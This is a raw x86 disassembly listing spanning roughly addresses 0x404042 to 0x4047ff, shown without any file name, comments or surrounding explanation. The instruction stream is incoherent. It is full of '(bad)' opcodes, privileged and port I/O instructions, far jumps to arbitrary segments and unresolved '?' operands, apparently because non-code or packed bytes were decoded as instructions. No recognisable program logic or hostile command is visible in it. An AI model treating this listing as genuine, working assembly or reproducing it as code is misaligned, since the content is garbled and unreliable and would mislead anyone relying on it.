  404042:	test   BYTE PTR [ebx-0x65eff93e],dl
  404048:	aam    0x34
  40404a:	sbb    BYTE PTR ds:0x756be4fb,bl
  404050:	lahf   
  404051:	push   esi
  404052:	out    0x8d,eax
  404054:	or     BYTE PTR [esi+0x4a0f635b],dh
  40405a:	stos   DWORD PTR es:[edi],eax
  40405b:	mov    ah,0x75
  40405d:	or     bl,dl
  40405f:	xor    BYTE PTR [ecx+0x77],cl
  404062:	push   cs
  404063:	mov    ah,0xb6
  404065:	mov    ds:0x9cd43243,eax
  40406a:	jl     0x403ff8
  40406c:	das    
  40406d:	cwde   
  40406e:	nop
  40406f:	dec    ecx
  404070:	mov    BYTE PTR [edx-0x7e],al
  404073:	xchg   edi,eax
  404074:	es (bad) 
  404076:	stos   DWORD PTR es:[edi],eax
  404077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404078:	lea    esp,[ebp-0xe]
  40407b:	cs pop ds
  40407d:	sbb    dh,dl
  40407f:	loopne 0x404020
  404081:	adc    edi,DWORD PTR [ecx+0x7410f9e0]
  404087:	adc    BYTE PTR [eax-0xb9e49e6],ch
  40408d:	xchg   DWORD PTR [edi+0x58dadf90],ecx
  404093:	inc    edx
  404094:	iret   
  404095:	je     0x404074
  404097:	xlat   BYTE PTR ds:[ebx]
  404098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404099:	rcr    BYTE PTR [edi-0x37],cl
  40409c:	out    0xb2,eax
  40409e:	pop    ss
  40409f:	mov    esi,0xf82f8d52
  4040a4:	push   edx
  4040a5:	sbb    ah,BYTE PTR [ebp-0x1b]
  4040a8:	int3   
  4040a9:	and    al,0x9b
  4040ab:	and    al,BYTE PTR [ebp+0x61]
  4040ae:	std    
  4040af:	iret   
  4040b0:	push   eax
  4040b1:	sti    
  4040b2:	int3   
  4040b3:	imul   edx,DWORD PTR [ebx+0x12],0x2cf2a0ab
  4040ba:	int3   
  4040bb:	sub    DWORD PTR [esi-0x48add322],ecx
  4040c1:	(bad)  
  4040c2:	outs   dx,BYTE PTR ds:[esi]
  4040c3:	mov    ds,WORD PTR [edi+0x644627c3]
  4040c9:	hlt    
  4040ca:	xlat   BYTE PTR ds:[ebx]
  4040cb:	inc    eax
  4040cc:	stos   DWORD PTR es:[edi],eax
  4040cd:	xchg   edx,eax
  4040ce:	xor    eax,0xd9605090
  4040d3:	loop   0x40414e
  4040d5:	repnz dec esp
  4040d7:	stos   DWORD PTR es:[edi],eax
  4040d8:	rcr    eax,cl
  4040da:	jns    0x4040ed
  4040dc:	scas   eax,DWORD PTR es:[edi]
  4040dd:	lock pop edi
  4040df:	and    DWORD PTR [edx],eax
  4040e1:	and    eax,0x944a6815
  4040e6:	out    0xa0,eax
  4040e8:	push   ebx
  4040e9:	mov    edx,0x2690bc64
  4040ee:	rcr    DWORD PTR [ebp-0x49],1
  4040f1:	mov    ds:0xe2f27486,eax
  4040f6:	push   ebp
  4040f7:	stos   BYTE PTR es:[edi],al
  4040f8:	mov    cl,0xcf
  4040fa:	leave  
  4040fb:	outs   dx,DWORD PTR ds:[esi]
  4040fc:	sub    edi,DWORD PTR [ebx+0x57172927]
  404102:	dec    edx
  404103:	les    ebp,FWORD PTR [esp+edi*2]
  404106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404107:	aas    
  404108:	ret    
  404109:	cmp    DWORD PTR [esi+0x7b],edi
  40410c:	div    BYTE PTR [esi+0x48]
  40410f:	xor    BYTE PTR [ebx+0x7c3b0731],cl
  404115:	adc    DWORD PTR [edi-0x21],ebx
  404118:	leave  
  404119:	lock sub DWORD PTR [edi+eiz*4-0x466ed32a],esp
  404121:	int3   
  404122:	jg     0x40410f
  404124:	add    DWORD PTR [ebp-0x76],ebx
  404127:	sar    BYTE PTR [edi-0x3c9054fd],1
  40412d:	(bad)  
  40412e:	jmp    0xd7c8:0x1bf11dab
  404135:	inc    eax
  404136:	sbb    eax,0xe7d68ce
  40413b:	jno    0x4040ea
  40413d:	dec    eax
  40413e:	sub    al,0xae
  404140:	in     al,dx
  404141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404142:	sub    BYTE PTR [edi+0x68],al
  404145:	xchg   ecx,eax
  404146:	mov    esi,0x38d46fbb
  40414b:	shr    DWORD PTR [edi-0x5c345627],cl
  404151:	inc    BYTE PTR [eax]
  404153:	adc    eax,esp
  404155:	inc    ebp
  404156:	xchg   DWORD PTR [ebp-0x5e3af610],edi
  40415c:	scas   eax,DWORD PTR es:[edi]
  40415d:	aas    
  40415e:	cmp    ebx,DWORD PTR [eax+0x6ac769d4]
  404164:	mov    cl,0x3f
  404166:	js     0x40414c
  404168:	cli    
  404169:	outs   dx,DWORD PTR ds:[esi]
  40416a:	test   BYTE PTR [edx-0x19],bl
  40416d:	dec    esi
  40416e:	sar    DWORD PTR [ecx],0x6e
  404171:	ds adc al,0xf8
  404174:	call   0x8e82:0xfc262833
  40417b:	pop    eax
  40417c:	add    eax,DWORD PTR [ecx+0x20c2a90a]
  404182:	sub    al,0x57
  404184:	pop    edx
  404185:	(bad)  
  404186:	cs dec ebp
  404188:	in     al,0x59
  40418a:	je     0x404154
  40418c:	jo     0x4041f3
  40418e:	xor    ebp,esp
  404190:	clc    
  404191:	test   BYTE PTR [ebx],0x57
  404194:	out    dx,eax
  404195:	ret    0xcdd
  404198:	jbe    0x40415d
  40419a:	shl    cl,1
  40419c:	xor    al,0x76
  40419e:	adc    al,0xc2
  4041a0:	pop    esi
  4041a1:	stos   BYTE PTR es:[edi],al
  4041a2:	imul   eax,DWORD PTR [eax],0xffffffd0
  4041a5:	data16 sti 
  4041a7:	jo     0x404159
  4041a9:	xor    BYTE PTR [ebx+0x4b682931],al
  4041af:	(bad)  
  4041b1:	std    
  4041b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b3:	icebp  
  4041b4:	xchg   esi,eax
  4041b5:	jg     0x4041c1
  4041b7:	dec    ebp
  4041b8:	repnz xchg esp,eax
  4041ba:	or     DWORD PTR [eax+0x7a],ecx
  4041bd:	inc    ebp
  4041be:	push   0x5a5e0608
  4041c3:	cmp    DWORD PTR [eax+0x756713e1],edi
  4041c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ca:	test   esi,esp
  4041cc:	std    
  4041cd:	mov    ah,0x9
  4041cf:	jg     0x4041d9
  4041d1:	or     edx,DWORD PTR [ecx+edi*2+0x4e4beeb3]
  4041d8:	outs   dx,BYTE PTR ds:[esi]
  4041d9:	add    BYTE PTR [esi],ch
  4041db:	scas   al,BYTE PTR es:[edi]
  4041dc:	rcl    bh,0xbe
  4041df:	(bad)  
  4041e1:	jmp    0xd48f:0xa5e398c
  4041e8:	and    al,0x7
  4041ea:	ja     0x40422f
  4041ec:	arpl   WORD PTR [esi],sp
  4041ee:	or     ebx,DWORD PTR [esi+0x52cd65da]
  4041f4:	mov    edi,0x9058c972
  4041f9:	jnp    0x40419f
  4041fb:	jne    0x404195
  4041fd:	test   al,0xb3
  4041ff:	mov    ebx,?
  404201:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404203:	rcl    BYTE PTR [esi],0xa6
  404206:	add    eax,0xbd16758
  40420b:	mov    fs,ecx
  40420d:	dec    ecx
  40420e:	sbb    DWORD PTR [esi+esi*4-0x43ad00a2],esp
  404215:	and    DWORD PTR [ecx+0x5b],esp
  404218:	sbb    eax,0x225b6e70
  40421d:	xchg   esi,eax
  40421e:	ret    
  40421f:	sub    cl,BYTE PTR [ebx-0x622689d8]
  404225:	cmp    DWORD PTR [ebx-0x1e49e143],0x9c89eee6
  40422f:	aaa    
  404230:	dec    edx
  404231:	xor    bh,BYTE PTR [esi]
  404233:	sbb    al,0x1a
  404235:	dec    esp
  404236:	sub    ecx,ebx
  404238:	cmp    eax,0x681a8fc1
  40423d:	pop    edi
  40423e:	mov    bh,0x29
  404240:	push   esp
  404241:	scas   eax,DWORD PTR es:[edi]
  404242:	test   DWORD PTR [ebx-0xaf89b04],esi
  404248:	stos   DWORD PTR es:[edi],eax
  404249:	popa   
  40424a:	cmp    esp,ebx
  40424c:	push   edi
  40424d:	cli    
  40424e:	sub    ch,BYTE PTR [ebx+0x74]
  404251:	mov    ch,0x94
  404253:	lods   al,BYTE PTR ds:[esi]
  404254:	pinsrw mm1,WORD PTR [eax+0x6],0x8
  404259:	jb     0x4042af
  40425b:	mov    eax,ds:0xdb2984a1
  404260:	jb     0x4041e9
  404262:	mov    dh,0x82
  404264:	out    dx,al
  404265:	push   0x82e319fc
  40426a:	mov    ebp,0xaa20b72e
  40426f:	fld    QWORD PTR [edx-0x17ac2434]
  404275:	sub    eax,0x6840d71d
  40427a:	call   0x18a6:0x4834c4f
  404281:	pop    esi
  404282:	lea    esi,ds:0xfac0b86d
  404288:	dec    edi
  404289:	xor    DWORD PTR gs:[ebx+edx*4],esi
  40428d:	pusha  
  40428e:	pop    esp
  40428f:	push   ebp
  404290:	in     eax,0xf0
  404292:	pop    esi
  404293:	mov    ebx,DWORD PTR [esi]
  404295:	add    eax,0x7ee07e24
  40429a:	aad    0x83
  40429c:	hlt    
  40429d:	push   esp
  40429e:	push   esp
  40429f:	ds or  ebp,esp
  4042a2:	sub    ah,dl
  4042a4:	mul    BYTE PTR [ebx]
  4042a6:	outs   dx,DWORD PTR ds:[esi]
  4042a7:	xchg   esi,eax
  4042a8:	dec    ebp
  4042a9:	xchg   eax,edi
  4042ab:	leave  
  4042ac:	test   DWORD PTR [edi],eax
  4042ae:	and    bh,ah
  4042b0:	mov    ds:0x2d80cfe0,al
  4042b5:	jge    0x4042bd
  4042b7:	mov    al,ds:0x67ccfc73
  4042bc:	add    DWORD PTR [esp+eiz*4+0x58318e2f],ebx
  4042c3:	jecxz  0x4042c2
  4042c5:	imul   ebp,DWORD PTR [esi],0xffffffc9
  4042c8:	push   edi
  4042c9:	inc    esp
  4042ca:	dec    ecx
  4042cb:	out    dx,eax
  4042cc:	sub    eax,0xcc726d45
  4042d1:	test   DWORD PTR [ebx],0x7838ab76
  4042d7:	jmp    0x3c55:0x4c144cf7
  4042de:	out    0xd5,eax
  4042e0:	jae    0x404337
  4042e2:	aaa    
  4042e3:	clc    
  4042e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e5:	add    DWORD PTR [ebp+esi*8-0x1e],ebx
  4042e9:	mov    cl,0xa3
  4042eb:	daa    
  4042ec:	adc    DWORD PTR [esi],ecx
  4042ee:	cwde   
  4042ef:	mov    bh,BYTE PTR [ecx+0x469ebbe8]
  4042f5:	dec    esi
  4042f6:	inc    ecx
  4042f7:	loope  0x404373
  4042f9:	shr    DWORD PTR [eax-0x71],0x2b
  4042fd:	xor    al,0x95
  4042ff:	sahf   
  404300:	jmp    0x73c7:0xd1e42b25
  404307:	mov    edi,0xb9ae0421
  40430c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40430d:	aad    0x63
  40430f:	test   DWORD PTR [eax-0x4d],ebx
  404312:	sbb    dh,BYTE PTR [eax+0x2d]
  404315:	cmc    
  404316:	sbb    edx,DWORD PTR [esi-0x478ccc28]
  40431c:	aad    0x3b
  40431e:	test   DWORD PTR [ebx-0x65],edi
  404321:	je     0x40431b
  404323:	and    DWORD PTR [edi+0xa504f7e],esi
  404329:	je     0x4042fc
  40432b:	xor    eax,0x5ff7b6f3
  404330:	mov    al,0x3a
  404332:	in     al,0xdc
  404334:	push   ds
  404335:	adc    eax,0xef28e092
  40433a:	add    eax,0xcec4a50e
  40433f:	pop    eax
  404340:	(bad)  [edx-0x59]
  404343:	add    eax,0xf80959d5
  404348:	mov    esp,es
  40434a:	cmp    al,BYTE PTR [ebx+0x72]
  40434d:	mov    ch,0x67
  40434f:	fcmovb st,st(5)
  404351:	cmp    al,0xe6
  404353:	stos   BYTE PTR es:[edi],al
  404354:	popf   
  404355:	add    DWORD PTR [edi+0x25],esi
  404358:	cli    
  404359:	inc    ebp
  40435a:	adc    eax,esp
  40435c:	fwait
  40435d:	outs   dx,DWORD PTR ds:[esi]
  40435e:	cld    
  40435f:	dec    ecx
  404360:	push   edx
  404361:	pushf  
  404362:	add    ebx,DWORD PTR [ebx+0x7e]
  404365:	xchg   esi,eax
  404366:	lods   eax,DWORD PTR ds:[esi]
  404367:	xor    eax,0xc907b9b6
  40436c:	or     al,0xbd
  40436e:	cmp    eax,0x164634b
  404373:	shl    BYTE PTR [eax-0x65],0xe1
  404377:	dec    edx
  404378:	mov    eax,DWORD PTR [ebp+0x5173b06a]
  40437e:	leave  
  40437f:	and    al,0x13
  404381:	pushf  
  404382:	sbb    DWORD PTR [esi+0x1ad9c0d9],0xffffffc6
  404389:	mov    esi,DWORD PTR [ecx+0x37]
  40438c:	lods   eax,DWORD PTR ds:[esi]
  40438d:	hlt    
  40438e:	outs   dx,BYTE PTR ds:[esi]
  40438f:	(bad)  
  404390:	push   edi
  404391:	pushf  
  404392:	mov    ?,WORD PTR [esi+0x662fb0e0]
  404398:	adc    eax,0x565c20ec
  40439d:	imul   dx,WORD PTR [edi-0x7e021124],0xb909
  4043a6:	push   ecx
  4043a7:	icebp  
  4043a8:	cmp    ch,ah
  4043aa:	mov    bh,0xed
  4043ac:	pop    ebp
  4043ad:	mov    WORD PTR [edx],?
  4043af:	lea    edx,[ebx-0x26c91eb4]
  4043b5:	call   0x4a02:0xab408f4c
  4043bc:	int    0x5f
  4043be:	xchg   ebp,eax
  4043bf:	outs   dx,DWORD PTR ds:[esi]
  4043c0:	pop    edi
  4043c1:	(bad)  
  4043c2:	mov    ebx,0xa50b6980
  4043c7:	call   DWORD PTR [edx+0x4]
  4043ca:	cdq    
  4043cb:	mov    bl,0xd7
  4043cd:	mov    bl,0xf0
  4043cf:	push   edx
  4043d0:	daa    
  4043d1:	fsub   st,st(7)
  4043d3:	stos   DWORD PTR es:[edi],eax
  4043d4:	loopne 0x4043d0
  4043d6:	jl     0x4043f5
  4043d8:	adc    BYTE PTR es:[ecx+0x327063b2],0xc3
  4043e0:	pop    ecx
  4043e1:	into   
  4043e2:	icebp  
  4043e3:	inc    esi
  4043e4:	sti    
  4043e5:	psubw  mm0,QWORD PTR gs:[edi-0x78517948]
  4043ed:	push   DWORD PTR [edi*8-0x647bf32b]
  4043f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f5:	xor    DWORD PTR [esi],ebp
  4043f7:	int    0x3
  4043f9:	clc    
  4043fa:	push   es
  4043fb:	xor    eax,0x8e911a63
  404400:	cs cmp bh,0x13
  404404:	mov    al,ds:0xe051bf4d
  404409:	mov    al,0x52
  40440b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40440c:	dec    ebp
  40440d:	lahf   
  40440e:	leave  
  40440f:	sahf   
  404410:	jmp    DWORD PTR [esi+0x30]
  404413:	mov    dh,0xd
  404415:	call   0x5e93:0xdecba6db
  40441c:	mov    bh,0xdd
  40441e:	sbb    al,0xd0
  404420:	repnz (bad) 
  404422:	sahf   
  404423:	call   0x9158539f
  404428:	adc    al,0x14
  40442a:	xor    BYTE PTR [esi+0x3a],al
  40442d:	dec    edi
  40442e:	out    dx,eax
  40442f:	push   ss
  404430:	jb     0x4043f3
  404432:	sub    eax,0x67b04cae
  404437:	adc    esi,0xffffffe4
  40443a:	mov    al,dl
  40443c:	dec    edi
  40443d:	xchg   ecx,eax
  40443e:	dec    eax
  40443f:	icebp  
  404440:	xchg   edx,eax
  404441:	sbb    BYTE PTR [ecx],ah
  404443:	mov    ebp,0xa56810d8
  404448:	jns    0x40444c
  40444a:	bswap  esi
  40444c:	jmp    0xcc6cb2f9
  404451:	loop   0x4043e9
  404453:	push   esi
  404454:	test   eax,0x8a6dbf25
  404459:	addr16 leave 
  40445b:	add    edi,DWORD PTR [edi]
  40445d:	xor    BYTE PTR [edi],ch
  40445f:	inc    edx
  404460:	jl     0x4043eb
  404462:	mov    BYTE PTR [ecx],0xc
  404465:	cmp    eax,0xe3e3a51b
  40446a:	fsub   DWORD PTR [edx]
  40446c:	xchg   ecx,eax
  40446d:	fsub   DWORD PTR ds:0xcce770ca
  404473:	iret   
  404474:	clc    
  404475:	mov    al,0xc9
  404477:	ret    
  404478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404479:	fcmovne st,st(4)
  40447b:	push   edi
  40447c:	enter  0x1921,0xe4
  404480:	jge    0x4044c5
  404482:	mov    ds:0x4648571a,eax
  404487:	xchg   ebx,eax
  404488:	push   0xffffffa7
  40448a:	pushf  
  40448b:	mov    ds:0xe4ff70c4,al
  404490:	int3   
  404491:	ficom  WORD PTR [eax]
  404493:	adc    esp,DWORD PTR [edx-0x19ab8de]
  404499:	inc    esp
  40449a:	call   0xdbdf:0x71285fd0
  4044a1:	cli    
  4044a2:	inc    eax
  4044a3:	sti    
  4044a4:	sbb    DWORD PTR [ebp-0x43],0x4171a868
  4044ab:	dec    ebp
  4044ac:	push   ebp
  4044ad:	daa    
  4044ae:	mov    BYTE PTR [esi],ch
  4044b0:	js     0x4044ce
  4044b2:	mov    edi,0x653d14d5
  4044b7:	pop    ebp
  4044b8:	and    cl,BYTE PTR [edi]
  4044ba:	sbb    eax,0xd1dce1f9
  4044bf:	inc    edi
  4044c0:	pop    ds
  4044c1:	dec    esi
  4044c2:	mov    es,WORD PTR [edx-0x4a]
  4044c5:	and    DWORD PTR [eax-0x30],ecx
  4044c8:	icebp  
  4044c9:	cmovnp ebp,DWORD PTR [esi-0x49]
  4044cd:	pop    esp
  4044ce:	add    BYTE PTR [edx-0x78],ah
  4044d1:	ret    0xddd2
  4044d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d5:	in     al,0x39
  4044d7:	retf   
  4044d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d9:	(bad)  
  4044da:	ins    DWORD PTR es:[edi],dx
  4044db:	test   BYTE PTR [ebx+0x1af0d096],ah
  4044e1:	fxch   st(2)
  4044e3:	inc    esp
  4044e4:	jp     0x40454c
  4044e6:	lds    edx,FWORD PTR [edi-0x6e]
  4044e9:	test   eax,0x505e2667
  4044ee:	ins    DWORD PTR es:[edi],dx
  4044ef:	xchg   ecx,eax
  4044f0:	out    0xd5,eax
  4044f2:	imul   esp,eax,0x21
  4044f5:	xchg   ecx,eax
  4044f6:	push   0x86af05e6
  4044fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fc:	dec    ebx
  4044fd:	std    
  4044fe:	sbb    BYTE PTR [edx+ecx*2+0x5fcc0396],cl
  404505:	imul   ebp,DWORD PTR [edi-0x18295d9d],0xbcb3ee38
  40450f:	enter  0xf65e,0x67
  404513:	jnp    0x404514
  404515:	call   0xf7215a0f
  40451a:	arpl   WORD PTR [esp+esi*8+0x38],si
  40451e:	jns    0x40454b
  404520:	adc    dl,dh
  404522:	sti    
  404523:	retf   
  404524:	sbb    al,0xed
  404526:	mov    bl,0x97
  404528:	hlt    
  404529:	mov    ds,WORD PTR [eax+0x25]
  40452c:	sub    al,0xeb
  40452e:	pop    esi
  40452f:	jns    0x404570
  404531:	sbb    DWORD PTR [edx],edx
  404533:	stc    
  404534:	or     ecx,edi
  404536:	int3   
  404537:	adc    al,0x7d
  404539:	(bad)  
  40453a:	cmp    dh,cl
  40453c:	dec    esi
  40453d:	dec    edi
  40453e:	jno    0x40452e
  404540:	pop    ebp
  404541:	push   esi
  404542:	fsub   QWORD PTR [edi-0x56]
  404545:	(bad)  
  404546:	sub    dh,bh
  404548:	(bad)  
  404549:	jmp    0x75148d11
  40454e:	dec    edi
  40454f:	xchg   ebx,eax
  404550:	mov    edx,0x92cebf5f
  404555:	xor    cl,BYTE PTR [esi-0x66]
  404558:	lds    ebp,FWORD PTR [edi-0xd6f575c]
  40455e:	popa   
  40455f:	pop    eax
  404560:	fld    QWORD PTR [ebx]
  404562:	mov    ebp,DWORD PTR [ebp+ebp*2-0x5367909d]
  404569:	dec    ebx
  40456a:	cmp    al,0x41
  40456c:	mov    WORD PTR ds:0xd0e6e647,ds
  404572:	data16 dec bx
  404575:	cmp    BYTE PTR [edx+ecx*1-0x2e],dh
  404579:	jnp    0x404568
  40457b:	adc    DWORD PTR [ebx],esp
  40457d:	ins    DWORD PTR es:[edi],dx
  40457e:	xor    al,0x82
  404580:	pop    esi
  404581:	push   ebp
  404582:	xor    dh,BYTE PTR [ebx-0x44c45434]
  404588:	adc    DWORD PTR ds:[ecx],ebp
  40458b:	adc    ecx,DWORD PTR [ebp+0x36d73ae8]
  404591:	push   es
  404592:	push   esi
  404593:	pop    esp
  404594:	test   al,0xcc
  404596:	dec    eax
  404597:	pushf  
  404598:	je     0x40458e
  40459a:	jge    0x4045fc
  40459c:	pop    edx
  40459d:	jp     0x4045d4
  40459f:	mov    ah,0xe5
  4045a1:	jmp    0xde723ae3
  4045a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045a7:	dec    esi
  4045a8:	repnz cmp ebx,DWORD PTR [ecx-0x5150e595]
  4045af:	or     eax,0xdc5d8796
  4045b4:	inc    edi
  4045b5:	retf   0x228a
  4045b8:	mov    edi,0x747601b3
  4045bd:	(bad)  
  4045bf:	sbb    al,0xea
  4045c1:	adc    DWORD PTR [ecx+0x9],eax
  4045c4:	sub    eax,0xa6e963ab
  4045c9:	cmp    BYTE PTR [ebx],bh
  4045cb:	sub    BYTE PTR [edx-0x66077c5d],ah
  4045d1:	cmc    
  4045d2:	add    esi,DWORD PTR [esi-0x9]
  4045d5:	xchg   edx,eax
  4045d6:	shl    DWORD PTR ds:0x964ed449,cl
  4045dc:	inc    ebx
  4045dd:	aaa    
  4045de:	(bad)  
  4045df:	and    eax,0x3efbc36
  4045e4:	push   ebx
  4045e5:	(bad)  [edi]
  4045e7:	pop    ecx
  4045e8:	cmp    ebx,esp
  4045ea:	das    
  4045eb:	jo     0x4045f1
  4045ed:	es push 0x35d93cbd
  4045f3:	leave  
  4045f4:	mov    dh,0xe1
  4045f6:	jbe    0x404637
  4045f8:	jns    0x404671
  4045fa:	pop    edi
  4045fb:	rol    esi,1
  4045fd:	clc    
  4045fe:	cmc    
  4045ff:	adc    al,0x5b
  404601:	retf   0x8de
  404604:	(bad)  [edi-0x4246a5bd]
  40460a:	pop    ds
  40460b:	pop    ss
  40460c:	pop    es
  40460d:	xlat   BYTE PTR ds:[ebx]
  40460e:	add    al,0xfc
  404610:	fdiv   QWORD PTR [eax-0x7d]
  404613:	outs   dx,DWORD PTR ds:[esi]
  404614:	pusha  
  404615:	jge    0x404625
  404617:	xchg   esi,eax
  404618:	xor    DWORD PTR [ebx+0x245ad35d],edi
  40461e:	or     BYTE PTR [bx+si-0x32],dh
  404622:	mov    ch,0x97
  404624:	ins    BYTE PTR es:[edi],dx
  404625:	outs   dx,DWORD PTR ds:[esi]
  404626:	call   0xd6d4:0x81bcccd9
  40462d:	mov    dl,0x48
  40462f:	or     ebp,ecx
  404631:	ror    BYTE PTR [eax+0x3b41ef04],0x35
  404638:	fnstsw WORD PTR ds:0xbb31964c
  40463e:	sbb    edx,0x580afd03
  404644:	das    
  404645:	xor    ecx,DWORD PTR [edi]
  404647:	bound  ecx,QWORD PTR [esi+0x39]
  40464a:	mov    ch,0x25
  40464c:	or     esi,DWORD PTR [ebx]
  40464e:	inc    esp
  40464f:	retf   0xe9b1
  404652:	pop    ecx
  404653:	inc    ebx
  404654:	inc    edx
  404655:	adc    al,0xf
  404657:	xchg   esi,eax
  404658:	push   es
  404659:	(bad)  
  40465a:	js     0x4046c7
  40465c:	cli    
  40465d:	cmc    
  40465e:	fnstenv [esp+edx*8+0x64]
  404662:	xor    DWORD PTR [eax+0x3c],0xfffffff5
  404666:	cwde   
  404667:	inc    esp
  404668:	mov    ah,0x85
  40466a:	ror    BYTE PTR [edi+edi*1+0x1a3f8ad0],cl
  404671:	and    al,BYTE PTR [ebx]
  404673:	or     eax,0x57d3ad57
  404678:	xor    ecx,DWORD PTR [edi-0x260ce0d4]
  40467e:	popf   
  40467f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404680:	or     edx,DWORD PTR [edi-0x50fef4fe]
  404686:	jns    0x404677
  404688:	jg     0x404669
  40468a:	jb     0x4046d2
  40468c:	xchg   DWORD PTR [ecx+0x4],edx
  40468f:	fisttp QWORD PTR [edx+0x116aa778]
  404695:	scas   al,BYTE PTR es:[edi]
  404696:	inc    eax
  404697:	jmp    DWORD PTR [eax+eiz*4+0x78e5f907]
  40469e:	and    BYTE PTR [ebx],dh
  4046a0:	mov    esi,0xe782897b
  4046a5:	add    al,BYTE PTR [ebx]
  4046a7:	mov    ebp,0x2c186a4f
  4046ac:	mov    bh,0x20
  4046ae:	cmp    DWORD PTR [edx+0x2e],ecx
  4046b1:	pop    esp
  4046b2:	leave  
  4046b3:	xchg   esp,eax
  4046b4:	pop    ebp
  4046b5:	xchg   ebx,eax
  4046b6:	pop    es
  4046b7:	lds    edi,FWORD PTR [esi]
  4046b9:	stos   DWORD PTR es:[edi],eax
  4046ba:	xchg   esp,eax
  4046bb:	jg     0x404705
  4046bd:	out    0x5,al
  4046bf:	in     al,dx
  4046c0:	cdq    
  4046c1:	hlt    
  4046c2:	and    BYTE PTR [ebx-0x34584ace],0x29
  4046c9:	lahf   
  4046ca:	fbstp  TBYTE PTR [ecx+0x7c26dbd5]
  4046d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d1:	xlat   BYTE PTR ds:[ebx]
  4046d2:	and    dh,BYTE PTR [ebp+eax*2-0xe891907]
  4046d9:	mov    bh,0x5e
  4046db:	or     al,0x50
  4046dd:	dec    ecx
  4046de:	dec    ebx
  4046df:	adc    DWORD PTR [edx+0x12],0xd692d324
  4046e6:	es and al,0x17
  4046e9:	push   ebp
  4046ea:	ret    0xa3fa
  4046ed:	adc    eax,0x29f6a5a8
  4046f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f3:	dec    ebp
  4046f4:	mov    al,ds:0x7c30f94
  4046f9:	je     0x404772
  4046fb:	es push 0x68
  4046fe:	aam    0x24
  404700:	cdq    
  404701:	mov    al,0x2e
  404703:	ds push ebp
  404705:	lea    ecx,[esi+0x70]
  404708:	push   0xb54f7459
  40470d:	mov    ds:0x10513838,eax
  404712:	rcr    DWORD PTR [esi-0x2da8d551],1
  404718:	jae    0x4046ed
  40471a:	sbb    al,0x2f
  40471c:	stc    
  40471d:	inc    edx
  40471e:	pop    ebp
  40471f:	aaa    
  404720:	jmp    0x99ada5ce
  404725:	into   
  404726:	inc    edi
  404727:	pop    edi
  404728:	xor    BYTE PTR gs:[ebx-0x4b05c16e],dl
  40472f:	dec    esp
  404730:	nop
  404731:	cmovp  ebx,DWORD PTR [ebx-0x5b00dca4]
  404738:	fadd   DWORD PTR [esp+eax*4-0x58]
  40473c:	lds    ecx,FWORD PTR [edi+0x6e97765b]
  404742:	ins    DWORD PTR es:[edi],dx
  404743:	gs scas eax,DWORD PTR es:[edi]
  404745:	sub    esi,DWORD PTR [edi+0x5d57470b]
  40474b:	arpl   WORD PTR [esi-0x6822183d],ax
  404751:	in     al,0xdc
  404753:	ret    0x8f1f
  404756:	mov    ds:0x6283fb61,al
  40475b:	(bad)  
  40475c:	rcl    esi,cl
  40475e:	out    0x27,eax
  404760:	mov    BYTE PTR [ebp+0x24],ah
  404763:	mov    cl,BYTE PTR [ecx]
  404765:	scas   al,BYTE PTR es:[edi]
  404766:	jmp    0x99c37001
  40476b:	or     DWORD PTR [edx+0xa],esp
  40476e:	jb     0x4047ca
  404770:	or     edx,DWORD PTR [ebx-0x661271fe]
  404776:	enter  0x9cdc,0x72
  40477a:	test   ebx,edi
  40477c:	ins    DWORD PTR es:[edi],dx
  40477d:	add    ebx,DWORD PTR [ebx+0x779c2abf]
  404783:	sub    edi,DWORD PTR [esi-0xfce70e]
  404789:	mov    esp,0xd751f0e9
  40478e:	pushf  
  40478f:	ret    0xe86e
  404792:	loop   0x404807
  404794:	or     esi,esi
  404796:	adc    dh,BYTE PTR gs:[ecx-0x53b0a549]
  40479d:	push   ebx
  40479e:	lods   al,BYTE PTR ds:[esi]
  40479f:	sbb    BYTE PTR [esi-0x629ad0e],bl
  4047a5:	outs   dx,DWORD PTR ds:[esi]
  4047a6:	xchg   esi,eax
  4047a7:	pop    esi
  4047a8:	mov    ecx,0x15cf11f9
  4047ad:	xchg   DWORD PTR [edx],eax
  4047af:	inc    ecx
  4047b0:	sbb    DWORD PTR [ecx+0x1b],0x4a
  4047b4:	jnp    0x404749
  4047b6:	loop   0x404759
  4047b8:	pop    ds
  4047b9:	mov    edx,0x7456924d
  4047be:	mov    al,0x7e
  4047c0:	icebp  
  4047c1:	jb     0x40478b
  4047c3:	mov    cl,0x98
  4047c5:	pop    ebx
  4047c6:	jb     0x404777
  4047c8:	mov    cs,WORD PTR [ebp+0x6]
  4047cb:	dec    esi
  4047cc:	xchg   BYTE PTR [ebx+ebx*2],ch
  4047cf:	std    
  4047d0:	xchg   DWORD PTR [esi-0xe],esp
  4047d3:	std    
  4047d4:	add    al,0x7a
  4047d6:	in     al,dx
  4047d7:	mov    edx,0x33624255
  4047dc:	adc    al,0xe9
  4047de:	fcmovnu st,st(6)
  4047e0:	cmp    al,0xd3
  4047e2:	les    eax,FWORD PTR [ecx+0x37]
  4047e5:	xchg   BYTE PTR [ecx-0x4141b306],cl
  4047eb:	push   0xffffff82
  4047ed:	jno    0x40479c
  4047ef:	addr16 add ecx,eax
  4047f2:	xchg   ebx,eax
  4047f3:	mov    eax,0xd045bdae
  4047f8:	test   edx,0x2e32ab50
  4047fe:	(bad)  
  4047ff:	popa   
